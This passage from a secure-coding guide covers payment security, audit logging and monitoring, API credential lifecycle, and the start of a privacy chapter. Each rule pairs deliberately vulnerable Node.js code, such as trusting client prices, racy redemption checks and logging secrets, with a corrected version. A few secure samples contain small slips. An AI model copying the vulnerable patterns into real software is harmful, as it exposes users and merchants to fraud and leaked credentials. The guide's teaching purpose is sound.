**Rule 1: The server is the single source of truth for prices -- never accept prices from the client.**

Attackers intercept checkout requests and modify prices, discounts, or totals. The server must look up every price from its own database at the moment of payment creation.

Vulnerable:

```javascript
// VULNERABLE -- attacker changes price to $0.01 in the request
app.post('/api/checkout', async (req, res) => {
  const total = req.body.items.reduce((sum, i) => sum + i.price * i.quantity, 0);
  const intent = await stripe.paymentIntents.create({
    amount: Math.round(total * 100),
    currency: 'usd',
  });
  res.json({ clientSecret: intent.client_secret });
});
```

Secure:

```javascript
// SECURE -- server looks up every price from its own database
app.post('/api/checkout', async (req, res) => {
  const itemIds = req.body.items.map(i => i.productId);
  const products = await db.products.findMany({
    where: { id: { in: itemIds } },
  });

  let totalCents = 0;
  for (const item of req.body.items) {
    const product = products.find(p => p.id === item.productId);
    if (!product) return res.status(400).json({ error: 'Product not found' });
    if (item.quantity < 1 || item.quantity > 100) {
      return res.status(400).json({ error: 'Invalid quantity' });
    }
    totalCents += product.priceInCents * item.quantity;
  }

  const intent = await stripe.paymentIntents.create({
    amount: totalCents,
    currency: 'usd',
    metadata: { orderId: order.id },
  });
  res.json({ clientSecret: intent.client_secret });
});
```

**Rule 2: Always verify webhook signatures using timing-safe comparison on the raw body.**

Webhook payloads confirm payment events. Without signature verification, an attacker can POST fake "payment succeeded" events to your webhook endpoint. The signature must be computed over the raw request body -- not a parsed-and-re-serialized version, which may differ in whitespace or key ordering.

```javascript
// SECURE -- raw body + signature verification
app.post('/webhooks/stripe',
  express.raw({ type: 'application/json' }),
  async (req, res) => {
    let event;
    try {
      event = stripe.webhooks.constructEvent(
        req.body,
        req.headers['stripe-signature'],
        process.env.STRIPE_WEBHOOK_SECRET
      );
    } catch (err) {
      return res.status(400).send('Invalid signature');
    }

    switch (event.type) {
      case 'checkout.session.completed':
        await fulfillOrder(event.data.object);
        break;
    }
    res.json({ received: true });
  }
);
```

**Rule 3: Never trust the client to report payment status -- verify via server-side API calls or webhooks only.**

A client-side redirect to "/success" does not mean payment succeeded. Always confirm payment status server-side before granting access or fulfilling orders.

```javascript
// VULNERABLE -- trusting client redirect
// if (router.query.status === 'success') grantAccess();

// SECURE -- verify payment server-side before granting access
app.get('/api/order/:id/status', async (req, res) => {
  const order = await db.orders.findUnique({ where: { id: req.params.id } });
  const intent = await stripe.paymentIntents.retrieve(order.stripePaymentIntentId);
  if (intent.status === 'succeeded') {
    await db.orders.update({ where: { id: order.id }, data: { status: 'paid' } });
    return res.json({ status: 'paid' });
  }
  res.json({ status: 'pending' });
});
```

**Rule 4: Use database unique constraints for double-spend prevention, not check-then-act.**

A race condition exists between checking "has this payment been redeemed?" and inserting the redemption record. Two concurrent requests can both pass the check. Use a unique database constraint so the second insert fails atomically.

Vulnerable:

```javascript
// VULNERABLE -- race condition between check and insert
const existing = await db.redemptions.findFirst({ where: { paymentId } });
if (existing) return res.status(409).send('Already redeemed');
await db.redemptions.create({ data: { paymentId, userId } });
// Two concurrent requests can both pass the findFirst check
```

Secure:

```javascript
// SECURE -- unique constraint on paymentId prevents double-spend atomically
try {
  await db.$transaction(async (tx) => {
    // paymentId column has @unique constraint in schema
    await tx.redemptions.create({ data: { paymentId, userId } });
    await tx.itemAccess.create({ data: { userId, itemId } });
  });
} catch (err) {
  if (err.code === 'P2002') {
    // Unique constraint violation -- payment already redeemed
    return res.status(409).json({ error: 'Already redeemed' });
  }
  throw err;
}
```

**Rule 5: Every side-effecting operation must be idempotent -- use client-provided idempotency keys.**

Network retries, queue redelivery, and webhook duplicates all create scenarios where operations execute multiple times. Store the idempotency key with the result so repeated requests return the same response without re-executing the operation.

```javascript
app.post('/api/charge', async (req, res) => {
  const idempotencyKey = req.headers['idempotency-key'];
  if (!idempotencyKey) return res.status(400).json({ error: 'Idempotency-Key required' });

  // Check for existing result
  const existing = await db.operations.findUnique({ where: { idempotencyKey } });
  if (existing) return res.status(200).json(existing.result);

  // Execute and store result atomically
  const result = await db.$transaction(async (tx) => {
    const op = await tx.operations.create({
      data: { idempotencyKey, status: 'processing' },
    });
    const charge = await processCharge(req.body);
    await tx.operations.update({
      where: { id: op.id },
      data: { status: 'completed', result: charge },
    });
    return charge;
  });

  res.json(result);
});
```

**Rule 6: Do not embed subscription status in JWTs -- check the database.**

JWT claims are frozen at issuance and valid until expiry. A user who cancels their subscription retains access for the full token lifetime. Always check current subscription status from the database at the point of authorization.

```javascript
// VULNERABLE -- JWT says "pro" even after cancellation
// const plan = req.jwt.claims.plan;

// SECURE -- check subscription status at decision time
async function requirePlan(plan) {
  return async (req, res, next) => {
    const sub = await db.subscriptions.findFirst({
      where: {
        userId: req.user.id,
        status: 'active',
        plan: plan,
      },
    });
    if (!sub) return res.status(403).json({ error: `${plan} plan required` });
    next();
  };
}

app.get('/api/pro-feature', await requirePlan('pro'), handler);
```

**Rule 7: Use hosted payment fields so card data never touches your JavaScript.**

Stripe Elements, Braintree Drop-in, and Adyen Web Components render payment inputs in iframes from the payment provider's domain. Card numbers never pass through your frontend JavaScript. If raw card data flows through your code, every script on the page (including third-party analytics, ads, and chat widgets) is in PCI scope.

**Rule 8: Token refresh must be deduplicated -- serialize concurrent refresh requests.**

When an access token expires, multiple concurrent API calls all detect the expiry simultaneously and attempt to refresh. Without deduplication, this generates multiple refresh requests, which may invalidate each other (if refresh tokens are single-use) and cause cascading auth failures.

```javascript
// Singleton promise pattern -- only one refresh in flight at a time
let refreshPromise = null;

async function refreshTokenOnce() {
  if (!refreshPromise) {
    refreshPromise = (async () => {
      try {
        const res = await fetch('/api/auth/refresh', {
          method: 'POST',
          credentials: 'include',
        });
        if (!res.ok) throw new Error('Refresh failed');
        const { accessToken } = await res.json();
        setAccessToken(accessToken);
        return accessToken;
      } finally {
        refreshPromise = null;
      }
    })();
  }
  return refreshPromise;
}

// All concurrent callers await the same promise
```

## Verification

- Confirm no client-sent prices or totals are used in payment intent creation -- server must look up all prices
- Verify webhook endpoints use `express.raw()` (or equivalent raw body access) and cryptographic signature verification
- Check database schema for unique constraints on payment IDs and redemption records
- Search for subscription status in JWT claims or session objects -- should be checked from the database at authorization time
- Verify idempotency key handling on all payment-related and fulfillment endpoints
- Confirm payment forms use hosted fields (Stripe Elements, Braintree Drop-in), not raw `<input>` elements for card data
- Test webhook endpoint with an invalid signature to confirm it returns 400

---

── Page 29 ──

# Chapter 28: Security Logging, Monitoring, and Audit Trails

**Threat Summary:** Insufficient logging and monitoring (OWASP A09:2021) allows attackers to operate undetected, extend dwell time, and cover their tracks. Without structured audit trails, you cannot perform incident response, detect privilege escalation, or satisfy compliance requirements. Most breaches go undetected for months because the application simply never recorded the evidence.

**Severity:** CRITICAL — Without logging, every other security control is unverifiable. You cannot detect breaches, prove compliance, or perform forensic analysis.

## Quick Reference: What to Log vs. What to Redact

| Event Category | Log It | Redact / Never Log |
|----------------|--------|--------------------|
| Authentication | Login success/failure, logout, MFA events, session creation | Passwords, password hashes, MFA codes, session tokens |
| Authorization | Access denied events, role changes, permission checks | Full bearer tokens, API key values |
| Admin Actions | User tier changes, item deletion, email sends, role assignments | Credit card numbers, full SSNs |
| API Keys | Key created, key revoked, key used (key prefix only) | Full API key value (log last 4 chars only) |
| Input Validation | Rejected inputs, blocked requests, malformed payloads | Raw request bodies containing PII |
| Data Access | Bulk exports, admin data views, cross-tenant queries | Full query results, file contents |
| System Events | Deployment, config changes, cron execution, migration runs | Environment variable values, database credentials |

## Core Rules

**Rule 1: Log all authentication events with structured context**

Every authentication event — success or failure — must be logged with enough context to reconstruct what happened, but never enough to replay the credentials.

```javascript
// VULNERABLE — no logging on auth events
app.post("/api/auth/login", async (req, res) => {
  const user = await verifyCredentials(req.body.email, req.body.password);
  if (!user) return res.status(401).json({ error: "Invalid credentials" });
  const session = await createSession(user.id);
  return res.json({ token: session.token });
});

// SECURE — structured logging on every auth path
app.post("/api/auth/login", async (req, res) => {
  const { email } = req.body;
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const userAgent = req.headers["user-agent"];

  const user = await verifyCredentials(email, req.body.password);

  if (!user) {
    await auditLog({
      action: "AUTH_LOGIN_FAILED",
      actorType: "anonymous",
      actorId: null,
      targetType: "user",
      targetId: null,
      metadata: { email: maskEmail(email), reason: "invalid_credentials" },
      ipAddress: anonymizeIp(ip),
      userAgent,
    });
    return res.status(401).json({ error: "Invalid credentials" });
  }

  const session = await createSession(user.id);

  await auditLog({
    action: "AUTH_LOGIN_SUCCESS",
    actorType: "user",
    actorId: user.id,
    targetType: "session",
    targetId: session.id,
    metadata: { method: "password" },
    ipAddress: anonymizeIp(ip),
    userAgent,
  });

  return res.json({ token: session.token });
});
```

**Rule 2: Log all admin and privileged actions to an append-only audit trail**

Admin actions are the highest-value events. Every mutation performed by an admin must create an immutable audit record. Use a dedicated audit table — never rely on application logs alone, as those can be rotated or deleted.

```prisma
// Prisma schema for AuditLog
model AuditLog {
  id         String   @id @default(cuid())
  actorId    String?
  actorType  String   // "user" | "admin" | "system" | "cron" | "api_key"
  action     String   // "USER_TIER_CHANGED" | "ITEM_DELETED" | "ROLE_CHANGED" etc.
  targetType String   // "user" | "item" | "listing" | "apiKey" | "subscription"
  targetId   String?
  metadata   Json?    // Additional context (old value, new value, reason)
  ipAddress  String?  // Anonymized IP
  userAgent  String?
  timestamp  DateTime @default(now())

  @@index([actorId])
  @@index([targetType, targetId])
  @@index([action])
  @@index([timestamp])
}
```

```javascript
// VULNERABLE — admin changes user tier with no record
app.post("/api/admin/users/:id/tier", requireAdmin, async (req, res) => {
  await db.user.update({
    where: { id: req.params.id },
    data: { tier: req.body.tier },
  });
  return res.json({ success: true });
});

// SECURE — every admin action creates an immutable audit entry
app.post("/api/admin/users/:id/tier", requireAdmin, async (req, res) => {
  const targetUser = await db.user.findUnique({ where: { id: req.params.id } });
  if (!targetUser) return res.status(404).json({ error: "User not found" });

  const oldTier = targetUser.tier;
  const newTier = req.body.tier;

  await db.$transaction([
    db.user.update({
      where: { id: req.params.id },
      data: { tier: newTier },
    }),
    db.auditLog.create({
      data: {
        actorId: req.adminId,
        actorType: "admin",
        action: "USER_TIER_CHANGED",
        targetType: "user",
        targetId: req.params.id,
        metadata: { oldTier, newTier, reason: req.body.reason || null },
        ipAddress: anonymizeIp(req.ip),
        userAgent: req.headers["user-agent"],
      },
    }),
  ]);

  return res.json({ success: true });
});
```

**Rule 3: Never log secrets, tokens, passwords, or raw PII**

Logs are often stored in less-secured systems (log aggregators, monitoring dashboards, error tracking). A single leaked log line containing an API key or password hash compromises the entire account.

```javascript
// VULNERABLE — logs contain secrets
console.log(`User ${userId} created API key: ${apiKey}`);
console.log(`Login attempt for ${email} with password ${password}`);
console.log(`Webhook received with headers: ${JSON.stringify(req.headers)}`);

// SECURE — mask and redact sensitive values
console.log(`User ${userId} created API key: ${maskApiKey(apiKey)}`);
// Outputs: "User abc123 created API key: ck_...x7f2"

console.log(`Login attempt for ${maskEmail(email)}`);
// Outputs: "Login attempt for s***r@g***l.com"

// Never log authorization headers
const safeHeaders = { ...req.headers };
delete safeHeaders.authorization;
delete safeHeaders.cookie;
console.log(`Webhook received with headers: ${JSON.stringify(safeHeaders)}`);

// Helper functions
function maskApiKey(key: string): string {
  if (!key || key.length < 8) return "****";
  return `${key.slice(0, 3)}...${key.slice(-4)}`;
}

function maskEmail(email: string): string {
  const [local, domain] = email.split("@");
  if (!domain) return "***";
  return `${local[0]}***${local[local.length - 1]}@${domain[0]}***${domain.slice(domain.lastIndexOf("."))}`;
}
```

**Rule 4: Use structured JSON logging with consistent fields**

Unstructured text logs are difficult to search, alert on, and correlate. Use a consistent JSON structure so your monitoring tools can parse and index every field.

```javascript
// VULNERABLE — unstructured text logs
console.log(`[${new Date()}] User ${userId} deleted item ${itemId} from IP ${ip}`);

// SECURE — structured JSON logging
import pino from "pino";

const logger = pino({
  level: process.env.LOG_LEVEL || "info",
  redact: {
    paths: ["req.headers.authorization", "req.headers.cookie", "*.password", "*.token"],
    censor: "[REDACTED]",
  },
  formatters: {
    level(label) {
      return { level: label };
    },
  },
});

// Usage
logger.info({
  event: "ITEM_DELETED",
  actorId: userId,
  actorType: "user",
  targetType: "item",
  targetId: itemId,
  ip: anonymizeIp(ip),
  timestamp: new Date().toISOString(),
});
```

**Rule 5: Implement monitoring and alerting for security-relevant patterns**

Logging without monitoring is just writing to a file. Define alert thresholds for patterns that indicate attacks or compromise.

```javascript
// Brute-force detection: track failed logins per IP
const FAILED_LOGIN_THRESHOLD = 10;
const FAILED_LOGIN_WINDOW_MS = 15 * 60 * 1000; // 15 minutes

async function checkBruteForce(ip: string): Promise<boolean> {
  const recentFailures = await db.auditLog.count({
    where: {
      action: "AUTH_LOGIN_FAILED",
      ipAddress: anonymizeIp(ip),
      timestamp: { gte: new Date(Date.now() - FAILED_LOGIN_WINDOW_MS) },
    },
  });

  if (recentFailures >= FAILED_LOGIN_THRESHOLD) {
    logger.warn({
      event: "BRUTE_FORCE_DETECTED",
      ip: anonymizeIp(ip),
      failedAttempts: recentFailures,
      windowMinutes: 15,
    });
    // Trigger alert (webhook, email, PagerDuty, etc.)
    await sendSecurityAlert("brute_force", {
      ip: anonymizeIp(ip),
      attempts: recentFailures,
    });
    return true;
  }
  return false;
}

// Privilege escalation detection: alert when non-admin hits admin routes repeatedly
async function detectPrivilegeEscalation(userId: string, route: string): Promise<void> {
  if (route.startsWith("/api/admin")) {
    const recentAttempts = await db.auditLog.count({
      where: {
        actorId: userId,
        action: "AUTHORIZATION_DENIED",
        metadata: { path: ["route"], string_contains: "/api/admin" },
        timestamp: { gte: new Date(Date.now() - 60 * 60 * 1000) },
      },
    });

    if (recentAttempts >= 3) {
      await sendSecurityAlert("privilege_escalation_attempt", {
        userId,
        route,
        attempts: recentAttempts,
      });
    }
  }
}

// Unusual admin activity: alert when admin performs bulk operations
async function detectUnusualAdminActivity(adminId: string): Promise<void> {
  const oneHourAgo = new Date(Date.now() - 60 * 60 * 1000);

  const recentAdminActions = await db.auditLog.count({
    where: {
      actorId: adminId,
      actorType: "admin",
      timestamp: { gte: oneHourAgo },
    },
  });

  // Alert if admin performs more than 50 actions in an hour
  if (recentAdminActions >= 50) {
    await sendSecurityAlert("unusual_admin_activity", {
      adminId,
      actionCount: recentAdminActions,
      windowMinutes: 60,
    });
  }
}
```

**Rule 6: Define and enforce log retention policies with automated cleanup**

Logs grow indefinitely without retention policies. Define how long each log category should be retained, and automate cleanup.

```javascript
// Retention policy configuration
const RETENTION_POLICIES = {
  AUTH_LOGIN_FAILED: 90,    // days — keep failed logins for 90 days
  AUTH_LOGIN_SUCCESS: 30,   // days — keep successful logins for 30 days
  USER_TIER_CHANGED: 365,   // days — keep admin actions for 1 year
  ITEM_DELETED: 365,        // days — keep deletion records for 1 year
  AUTHORIZATION_DENIED: 90,
  API_KEY_CREATED: 365,
  API_KEY_REVOKED: 365,
  ACCOUNT_DELETED: 365,
  DEFAULT: 90,              // days — default retention
};

// Cron job: run daily to purge expired audit logs
async function cleanupAuditLogs(): Promise<void> {
  const now = new Date();

  for (const [action, retentionDays] of Object.entries(RETENTION_POLICIES)) {
    if (action === "DEFAULT") continue;

    const cutoff = new Date(now.getTime() - retentionDays * 24 * 60 * 60 * 1000);
    const deleted = await db.auditLog.deleteMany({
      where: {
        action,
        timestamp: { lt: cutoff },
      },
    });

    if (deleted.count > 0) {
      logger.info({
        event: "AUDIT_LOG_CLEANUP",
        action,
        deletedCount: deleted.count,
        retentionDays,
        cutoffDate: cutoff.toISOString(),
      });
    }
  }

  // Clean up any actions not explicitly listed using default retention
  const defaultCutoff = new Date(
    now.getTime() - RETENTION_POLICIES.DEFAULT * 24 * 60 * 60 * 1000
  );
  const explicitActions = Object.keys(RETENTION_POLICIES).filter((k) => k !== "DEFAULT");
  await db.auditLog.deleteMany({
    where: {
      action: { notIn: explicitActions },
      timestamp: { lt: defaultCutoff },
    },
  });
}
```

## Verification

- Trigger a failed login attempt and verify an audit log entry is created with `AUTH_LOGIN_FAILED`
- Perform an admin action (e.g., change user tier) and verify the audit log contains the old value, new value, and admin actor ID
- Search log output for patterns like `password`, `token`, `Bearer`, `sk_`, `ck_` — none should appear unmasked
- Verify that `authorization` and `cookie` headers are never present in structured log output
- Check that the `AuditLog` table has appropriate indexes on `actorId`, `action`, `targetType + targetId`, and `timestamp`
- Run the retention cleanup job and verify that records older than the retention period are deleted
- Simulate 10+ failed logins from the same IP and verify the brute-force alert fires
- Verify that audit log entries cannot be updated or deleted through any API endpoint (append-only enforcement)
- Confirm that admin actions exceeding 50 per hour trigger an unusual activity alert

---

── Page 30 ──

# Chapter 29: Credential Lifecycle Management

**Threat Summary:** API keys and tokens that never expire, are never rotated, and have no usage limits create a persistent attack surface. Leaked credentials remain valid indefinitely, and without lifecycle management, there is no way to detect or respond to credential compromise. Organizations routinely discover API keys in git history, CI logs, and error reports months after they were committed.

**Severity:** HIGH — Credentials without expiration or rotation are the most common source of unauthorized access in API-driven applications.

## Quick Reference: Credential Lifecycle Matrix

| Credential Type | Recommended TTL | Max Active per User | Rotation Strategy | Revocation Delay |
|----------------|----------------|--------------------|--------------------|-----------------|
| API Key (production) | 90 days | 5 | Create new, 24h grace period, revoke old | Immediate (< 1s) |
| API Key (development) | 30 days | 3 | Create new, revoke old immediately | Immediate (< 1s) |
| Password Reset Token | 1 hour | 1 | Single-use, auto-expire | Immediate |
| Email Verification Token | 24 hours | 1 | Resend creates new, invalidates old | Immediate |
| OAuth Refresh Token | 30 days | 3 (per provider) | Auto-rotate on use | Immediate |
| CLI Session Token | 7 days | 2 | Re-authenticate to create new | Immediate |
| Webhook Signing Secret | 180 days | 2 (for rotation) | Create new, both valid during rollover | Immediate |

## Core Rules

**Rule 1: Limit active credentials per user**

Users should not accumulate unlimited API keys. Set a hard cap and enforce it at creation time. This limits the blast radius of compromised accounts and makes credential inventory manageable.

```javascript
// VULNERABLE — no limit on active API keys
app.post("/api/keys", requireAuth, async (req, res) => {
  const key = generateApiKey();
  const hashedKey = await hashApiKey(key);
  await db.apiKey.create({
    data: {
      userId: req.userId,
      keyHash: hashedKey,
      prefix: key.slice(0, 7),
      name: req.body.name,
    },
  });
  return res.json({ key }); // Only time the full key is shown
});

// SECURE — enforce maximum active keys
const MAX_API_KEYS = 5;

app.post("/api/keys", requireAuth, async (req, res) => {
  const activeKeyCount = await db.apiKey.count({
    where: {
      userId: req.userId,
      revokedAt: null,
      OR: [
        { expiresAt: null },
        { expiresAt: { gt: new Date() } },
      ],
    },
  });

  if (activeKeyCount >= MAX_API_KEYS) {
    return res.status(400).json({
      error: `Maximum ${MAX_API_KEYS} active API keys allowed. Revoke an existing key first.`,
    });
  }

  const key = generateApiKey();
  const hashedKey = await hashApiKey(key);
  const expiresAt = new Date(Date.now() + 90 * 24 * 60 * 60 * 1000); // 90 days

  await db.apiKey.create({
    data: {
      userId: req.userId,
      keyHash: hashedKey,
      prefix: key.slice(0, 7),
      name: req.body.name || "Untitled Key",
      expiresAt,
    },
  });

  await auditLog({
    action: "API_KEY_CREATED",
    actorId: req.userId,
    actorType: "user",
    targetType: "apiKey",
    targetId: key.slice(0, 7), // Log prefix only
    metadata: { name: req.body.name, expiresAt: expiresAt.toISOString() },
    ipAddress: anonymizeIp(req.ip),
  });

  return res.json({ key, expiresAt }); // Only time the full key is shown
});
```

**Rule 2: Set TTL/expiration on all credentials**

No credential should live forever. Every token, key, and secret must have an expiration date set at creation time. The authentication middleware must check expiration on every request — an expired key is as invalid as a revoked one.

```javascript
// VULNERABLE — API key validation ignores expiration
async function validateApiKey(key: string): Promise<User | null> {
  const hashedKey = await hashApiKey(key);
  const apiKey = await db.apiKey.findFirst({ where: { keyHash: hashedKey } });
  if (!apiKey) return null;
  return db.user.findUnique({ where: { id: apiKey.userId } });
}

// SECURE — check expiration and revocation status on every validation
async function validateApiKey(key: string): Promise<User | null> {
  const hashedKey = await hashApiKey(key);
  const apiKey = await db.apiKey.findFirst({
    where: {
      keyHash: hashedKey,
      revokedAt: null, // Not revoked
    },
  });

  if (!apiKey) return null;

  // Check expiration
  if (apiKey.expiresAt && apiKey.expiresAt < new Date()) {
    await auditLog({
      action: "API_KEY_EXPIRED_USAGE",
      actorType: "api_key",
      actorId: apiKey.userId,
      targetType: "apiKey",
      targetId: apiKey.prefix,
      metadata: { expiredAt: apiKey.expiresAt.toISOString() },
    });
    return null;
  }

  // Update last used timestamp (fire-and-forget for performance)
  db.apiKey.update({
    where: { id: apiKey.id },
    data: { lastUsedAt: new Date() },
  }).catch(() => {}); // Non-critical, don't block the request

  return db.user.findUnique({ where: { id: apiKey.userId } });
}
```

**Rule 3: Implement rotation with a grace period**

Key rotation should be seamless. The pattern is: create new key, allow both old and new to work during a grace period, then revoke the old key. This prevents downtime for integrations that need time to update their configuration.

```javascript
// Rotation endpoint — creates new key and schedules old key revocation
app.post("/api/keys/:keyId/rotate", requireAuth, async (req, res) => {
  const oldKey = await db.apiKey.findFirst({
    where: {
      id: req.params.keyId,
      userId: req.userId,
      revokedAt: null,
    },
  });

  if (!oldKey) {
    return res.status(404).json({ error: "Key not found or already revoked" });
  }

  const GRACE_PERIOD_MS = 24 * 60 * 60 * 1000; // 24 hours
  const gracePeriodEnd = new Date(Date.now() + GRACE_PERIOD_MS);
  const newExpiresAt = new Date(Date.now() + 90 * 24 * 60 * 60 * 1000);

  const newKeyValue = generateApiKey();
  const newKeyHash = await hashApiKey(newKeyValue);

  await db.$transaction([
    // Create the new key
    db.apiKey.create({
      data: {
        userId: req.userId,
        keyHash: newKeyHash,
        prefix: newKeyValue.slice(0, 7),
        name: `${oldKey.name} (rotated)`,
        expiresAt: newExpiresAt,
        rotatedFromId: oldKey.id,
      },
    }),
    // Schedule old key for revocation after grace period
    db.apiKey.update({
      where: { id: oldKey.id },
      data: { scheduledRevocationAt: gracePeriodEnd },
    }),
  ]);

  await auditLog({
    action: "API_KEY_ROTATED",
    actorId: req.userId,
    actorType: "user",
    targetType: "apiKey",
    targetId: oldKey.prefix,
    metadata: {
      newKeyPrefix: newKeyValue.slice(0, 7),
      gracePeriodEnds: gracePeriodEnd.toISOString(),
    },
    ipAddress: anonymizeIp(req.ip),
  });

  return res.json({
    newKey: newKeyValue,
    newExpiresAt,
    oldKeyRevokedAt: gracePeriodEnd,
    message: `Old key will remain valid until ${gracePeriodEnd.toISOString()}`,
  });
});
```

**Rule 4: Alert users on credential events**

Users must be notified when credentials are created, rotated, revoked, or used from a new location. Silent credential operations hide compromise — the user should always know when their credentials change.

```javascript
// Notify user when a credential event occurs
async function notifyCredentialEvent(
  userId: string,
  event: "created" | "revoked" | "rotated" | "expired" | "suspicious_usage",
  details: Record<string, unknown>
): Promise<void> {
  const user = await db.user.findUnique({ where: { id: userId } });
  if (!user?.email) return;

  const subjects: Record<string, string> = {
    created: "New API key created for your account",
    revoked: "An API key was revoked on your account",
    rotated: "An API key was rotated on your account",
    expired: "An API key has expired on your account",
    suspicious_usage: "Unusual API key usage detected on your account",
  };

  await sendEmail({
    to: user.email,
    subject: subjects[event],
    body: `
      Event: API Key ${event}
      Key: ${details.keyPrefix || "N/A"}
      Time: ${new Date().toISOString()}
      IP: ${details.ip || "N/A"}

      If you did not perform this action, revoke all API keys immediately
      at https://getcandlekeep.com/dashboard/settings and contact support.
    `,
  });
}
```

**Rule 5: Automate cleanup of expired and unused credentials**

Expired keys and keys that have not been used in a long time should be automatically revoked. Run a cleanup job on a daily schedule to enforce this.

```javascript
// Daily cron: revoke expired and unused credentials
async function cleanupCredentials(): Promise<void> {
  const now = new Date();

  // 1. Revoke expired keys
  const expired = await db.apiKey.updateMany({
    where: {
      revokedAt: null,
      expiresAt: { lt: now },
    },
    data: {
      revokedAt: now,
      revokedReason: "expired",
    },
  });

  // 2. Revoke keys past their scheduled revocation (from rotation grace periods)
  const scheduledRevocations = await db.apiKey.updateMany({
    where: {
      revokedAt: null,
      scheduledRevocationAt: { lt: now },
    },
    data: {
      revokedAt: now,
      revokedReason: "rotation_grace_period_ended",
    },
  });

  // 3. Revoke keys unused for 180 days and notify the user
  const unusedCutoff = new Date(now.getTime() - 180 * 24 * 60 * 60 * 1000);
  const unusedKeys = await db.apiKey.findMany({
    where: {
      revokedAt: null,
      lastUsedAt: { lt: unusedCutoff },
    },
  });

  for (const key of unusedKeys) {
    await db.apiKey.update({
      where: { id: key.id },
      data: { revokedAt: now, revokedReason: "unused_180_days" },
    });
    await notifyCredentialEvent(key.userId, "revoked", {
      keyPrefix: key.prefix,
      reason: "Unused for 180 days — automatically revoked for security",
    });
  }

  logger.info({
    event: "CREDENTIAL_CLEANUP",
    expiredRevoked: expired.count,
    scheduledRevoked: scheduledRevocations.count,
    unusedRevoked: unusedKeys.length,
  });
}
```

**Rule 6: Revocation must be immediate — no caching delays**

When a key is revoked, it must stop working on the very next request. If you cache API key lookups for performance, the cache must be invalidated on revocation. A revoked key that works for another hour due to caching is a security incident.

```javascript
// VULNERABLE — API key validation uses a long-lived cache
const keyCache = new Map<string, { userId: string; cachedAt: number }>();

async function validateApiKey(key: string): Promise<string | null> {
  const cached = keyCache.get(key);
  if (cached && Date.now() - cached.cachedAt < 3600000) { // 1 hour cache
    return cached.userId; // Revoked key still works for up to 1 hour!
  }
  // ... database lookup
}

// SECURE — invalidate cache on revocation, use short TTLs as a safety net
const KEY_CACHE_TTL_MS = 30_000; // 30 seconds max cache

app.post("/api/keys/:keyId/revoke", requireAuth, async (req, res) => {
  const apiKey = await db.apiKey.findFirst({
    where: { id: req.params.keyId, userId: req.userId, revokedAt: null },
  });

  if (!apiKey) return res.status(404).json({ error: "Key not found" });

  await db.apiKey.update({
    where: { id: apiKey.id },
    data: { revokedAt: new Date(), revokedReason: "user_revoked" },
  });

  // Immediately invalidate the cache entry
  await cache.del(`apikey:${apiKey.keyHash}`);

  // If using distributed cache (Redis), publish invalidation event
  // so all application instances clear their local cache
  await redis.publish("apikey:revoked", apiKey.keyHash);

  await auditLog({
    action: "API_KEY_REVOKED",
    actorId: req.userId,
    actorType: "user",
    targetType: "apiKey",
    targetId: apiKey.prefix,
    metadata: { reason: "user_revoked" },
    ipAddress: anonymizeIp(req.ip),
  });

  await notifyCredentialEvent(req.userId, "revoked", {
    keyPrefix: apiKey.prefix,
  });

  return res.json({ success: true, message: "Key revoked immediately" });
});

// Cache invalidation listener (subscribe on each application instance)
redis.subscribe("apikey:revoked", (keyHash: string) => {
  cache.del(`apikey:${keyHash}`);
});
```

## Verification

- Create API keys up to the limit (5), then attempt to create a 6th — verify it is rejected with a clear error message
- Create a key with a short TTL (for testing), wait for expiration, then attempt to use it — verify it returns 401
- Rotate a key and verify both old and new keys work during the 24-hour grace period
- After the grace period expires, run the cleanup job and verify the old key returns 401
- Revoke a key and immediately attempt to use it in the same second — verify it returns 401 with no delay
- Check that key creation, rotation, and revocation all produce audit log entries with correct action types
- Verify that full API key values never appear in logs — only the prefix (first 7 characters)
- Verify that the cleanup cron handles keys unused for 180 days, revokes them, and sends notification emails
- Test that expired key usage attempts are logged as `API_KEY_EXPIRED_USAGE` security events

---

── Page 31 ──

# Chapter 30: Privacy, Data Protection, and Compliance

**Threat Summary:** Collecting more data than necessary, retaining it indefinitely, and failing to provide deletion mechanisms creates legal liability (GDPR, CCPA) and amplifies the impact of any breach. Even if your application is secure, over-collection means a breach exposes far more personal data than necessary. Privacy failures also erode user trust and can result in significant regulatory fines.

**Severity:** HIGH — Privacy violations carry regulatory penalties (up to 4% of global revenue under GDPR) and make breaches significantly worse by increasing the volume of exposed personal data.

## Quick Reference: Data Retention and Anonymization Matrix

| Data Type | Retention Period | Anonymization Method | Legal Basis |
|-----------|-----------------|---------------------|-------------|
| User profile (name, email) | Until deletion requested | Full deletion | Contract / consent |
| Authentication logs | 90 days | IP anonymized at write time | Legitimate interest |
| Admin audit trail | 1 year | IP anonymized, actor preserved | Legitimate interest |
| Analytics events | 90 days | IP anonymized, userId hashed | Consent (opt-in) |
| API request logs | 30 days | IP anonymized, no request bodies | Legitimate interest |
| Error reports / stack traces | 30 days | PII stripped before storage | Legitimate interest |
| Payment data | Per payment processor (Stripe) | Never stored locally | Contract |
| Backups | 30 days rolling | Encrypted at rest | Legitimate interest |
| Session data | Until expiry (7 days) | Full deletion on logout | Contract |
| IP addresses (raw) | Never stored raw | Zero last octet (IPv4) or truncate (IPv6) | N/A |

## Core Rules

**Rule 1: Minimize data collection — only collect what you need**

Every field you collect is a liability. If you do not need a user's phone number, do not ask for it. If you do not need their physical address, do not store it. Review your database schema periodically and remove unused columns.

```javascript
// VULNERABLE — collects everything "just in case"
app.post("/api/auth/signup", async (req, res) => {
  const user = await db.user.create({
    data: {
      email: req.body.email,
      name: req.body.name,
      phone: req.body.phone,              // Not needed for the product
      dateOfBirth: req.body.dob,           // Not needed for the product
      address: req.body.address,           // Not needed for the product
      company: req.body.company,           // Not needed for the product
      ipAddress: req.ip,                   // Raw IP stored permanently
      userAgent: req.headers["user-agent"], // Stored permanently
    },
  });
});

// SECURE — collect only what the product requires
app.post("/api/auth/signup", async (req, res) => {
  const user = await db.user.create({
    data: {
      email: req.body.email,
      name: req.body.name,
      // No phone, address, DOB — not needed for product functionality
      // IP and user-agent go to time-limited audit trail (with anonymization), not user record
    },
  });
});
```

**Rule 2: Anonymize IP addresses before storage**

IP addresses are personal data under GDPR. Anonymize them before writing to any long-term storage (databases, log files, analytics). The standard approach is to zero the last octet for IPv4 and truncate IPv6 to the first three groups.

```javascript
// IP anonymization functions
function anonymizeIp(ip: string | undefined): string {
  if (!ip) return "unknown";

  // Handle IPv4-mapped IPv6 (::ffff:192.168.1.42)
  const ipv4Match = ip.match(/::ffff:(\d+\.\d+\.\d+\.\d+)/);
  if (ipv4Match) {
    ip = ipv4Match[1];
